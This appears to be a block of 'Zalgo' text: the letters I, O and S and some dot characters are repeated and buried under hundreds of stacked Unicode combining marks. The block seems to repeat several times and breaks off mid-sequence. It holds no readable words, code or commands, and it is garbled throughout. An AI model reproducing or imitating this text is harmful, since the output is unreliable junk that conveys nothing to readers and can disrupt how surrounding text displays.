̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̚̚͘͜͜͜͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠S̸̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̚͠͝͝